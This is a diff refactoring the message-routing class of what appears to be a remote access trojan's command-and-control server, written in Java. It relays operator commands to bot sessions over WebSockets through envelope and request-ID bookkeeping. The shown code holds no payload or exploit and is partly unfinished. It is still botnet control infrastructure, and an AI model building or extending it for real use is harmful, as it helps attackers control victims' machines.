@@ -2,7 +2,7 @@ package devs.alex.sah.rat.c2server.services.impl;
 
 import devs.alex.sah.rat.c2server.configuration.MessagesConfiguration;
 import devs.alex.sah.rat.c2server.models.AssociativePair;
-import devs.alex.sah.rat.c2server.utils.Utils;
+import devs.alex.sah.rat.c2server.services.MessagesBuilder;
 import lombok.extern.slf4j.Slf4j;
 import devs.alex.sah.rat.c2server.models.Message;
 import devs.alex.sah.rat.c2server.services.MessagesCoordinator;
@@ -24,19 +24,22 @@ public class MessagesCoordinatorImpl implements MessagesCoordinator {
 
     private final WebSocketSessionService botWSSessionService;
     private final WebSocketSessionService userWSSessionService;
+    private final MessagesBuilder messagesBuilder;
     private final MessagesConfiguration mConfig;
     public MessagesCoordinatorImpl(@Qualifier("botWebSocketSessionService") WebSocketSessionService botWSSessionService,
                                    @Qualifier("userWebSocketSessionService") WebSocketSessionService userWSSessionService,
-                                   MessagesConfiguration messagesConfiguration) {
+                                   MessagesBuilder messagesBuilder, MessagesConfiguration messagesConfiguration) {
         this.botWSSessionService = botWSSessionService;
         this.userWSSessionService = userWSSessionService;
+        this.messagesBuilder = messagesBuilder;
         this.mConfig = messagesConfiguration;
     }
 
 
     @Override
     public void handleBotTextMessage(WebSocketSession session, TextMessage message) {
-        Message<String> parsedMessage = Utils.parseMessage(message);
+        StringBuffer errors = new StringBuffer();
+        Message<String> parsedMessage = messagesBuilder.parseMessage(message, errors);
     }
 
     @Override
@@ -45,67 +48,73 @@ public class MessagesCoordinatorImpl implements MessagesCoordinator {
     }
 
     @Override
-    public void handleUserTextMessage(WebSocketSession session, TextMessage message) {
-        Message<String> parsedMessage = Utils.parseMessage(message);  // TODO validation
-        String recipientType = parsedMessage.params().get(mConfig.keys.recipientType);
+    public void handleUserTextMessage(WebSocketSession session, TextMessage toParse) { // TODO split on different methods
+        StringBuffer errors = new StringBuffer();
+        Message<String> message = messagesBuilder.parseMessage(toParse, errors);
 
-        if(recipientType.equals("S")) {
+        if(errors.length() != 0){
+            // TODO Message<String> validate basic params
+            // TODO send errors back to user
+            return;
+        }
+        String recipient = message.getRecipientType();
+
+        if(message.getRecipientType().equals("S")) {
             // TODO
+            return;
         } else{
 
-            String packageType = parsedMessage.params().get(mConfig.keys.packageType);
-            String recipientID = parsedMessage.params().get(mConfig.keys.recipientID);
-            String senderRequestId = parsedMessage.params().get(mConfig.keys.requestID);
-
             WebSocketSession recipientSession;
-            if(recipientType.equals("B")){
-                recipientSession = botWSSessionService.getSession(recipientID);
-            } else if(recipientType.equals("H")){
-                recipientSession =  userWSSessionService.getSession(recipientID);
+            if(message.getRecipientType().equals("B")){
+                // TODO Message<String> validate specified params
+                recipientSession = botWSSessionService.getSession(message.getRecipientID());
+            } else if(message.getRecipientType().equals("H")){
+                // TODO Message<String> validate specified params
+                recipientSession =  userWSSessionService.getSession(message.getRecipientID());
             } else {
                 log.error("ERROR"); // TODO Send error to user
                 return;
             }
 
-            if(packageType.equals("con")){ // CE - continuation envelope
-                String envelope = (String)recipientSession.getAttributes().get("CE-"+ senderRequestId);
-                sendTextMessage(recipientSession, envelope, parsedMessage.getPayload());
+            if(message.getPackageType().equals("con")){ // CE - continuation envelope
+                String envelope = (String)recipientSession.getAttributes().get("CE-"+ message.getRequestID());
+                sendTextMessage(recipientSession, envelope, message.payload());
                 return;
             }
 
-            if(packageType.equals("last")){ // LE - last envelope
-                String envelope = (String)recipientSession.getAttributes().get("LE-"+ senderRequestId);
-                sendTextMessage(recipientSession, envelope, parsedMessage.getPayload());
+            if(message.getPackageType().equals("last")){ // LE - last envelope
+                String envelope = (String)recipientSession.getAttributes().get("LE-"+ message.getRequestID());
+                sendTextMessage(recipientSession, envelope, message.payload());
 
-                recipientSession.getAttributes().remove("CE-" + senderRequestId);
-                recipientSession.getAttributes().remove("LE-" + senderRequestId);
+                recipientSession.getAttributes().remove("CE-" + message.getRequestID());
+                recipientSession.getAttributes().remove("LE-" + message.getRequestID());
                 return;
             }
 
-            String requiredResponse = parsedMessage.params().get(mConfig.keys.responseType);
-            String module = parsedMessage.params().get(mConfig.keys.module);
-
-            String association = recipientType.equals("H") ?
+            String association =  message.getRecipientType().equals("H") ?
                     (String)session.getAttributes().get("userId") : UUID.randomUUID().toString();
 
-            if(packageType.equals("first")){
-                if(recipientType.equals("B")){
+            if(message.getPackageType().equals("first")){
+                if( message.getRecipientType().equals("B")){
                     recipientSession.getAttributes()
-                            .put("CE-" + senderRequestId, Utils.generateBotEnvelope("con", module, association));
+                            .put("CE-" + message.getRequestID(), messagesBuilder.generateBotEnvelope("con", message.getModule(), association));
                     recipientSession.getAttributes()
-                            .put("LE-" + senderRequestId, Utils.generateBotEnvelope("last", module, association));
-                } else {
+                            .put("LE-" + message.getRequestID(), messagesBuilder.generateBotEnvelope("last", message.getModule(), association));
+                } else if( message.getRecipientType().equals("H")) {
+                    // TODO sending to User
+                } else{
                     log.error("Error"); // TODO
                 }
             }
 
-            if(recipientType.equals("H")){
-                sendTextMessage(recipientSession, Utils.generateUserEnvelope(packageType, module, association, requiredResponse), parsedMessage.getPayload());
+            // FIXME logic ?
+            if( message.getRecipientType().equals("H")){
+                sendTextMessage(recipientSession, messagesBuilder.generateUserEnvelope(message.getPackageType(), message.getModule(), association, message.getResponseType()), message.payload());
             } else{
-                sendTextMessage(recipientSession, Utils.generateBotEnvelope(packageType, module, association, requiredResponse), parsedMessage.getPayload());
+                sendTextMessage(recipientSession, messagesBuilder.generateBotEnvelope(message.getPackageType(), message.getModule(), association, message.getResponseType()), message.payload());
 
-                if(!requiredResponse.equals("none")) {
-                    recipientSession.getAttributes().put(association, new AssociativePair((String) session.getAttributes().get("userId"), senderRequestId));
+                if(!message.getResponseType().equals("none")) {
+                    recipientSession.getAttributes().put(association, new AssociativePair((String) session.getAttributes().get("userId"), message.getRequestID()));
                 }
             }
         }
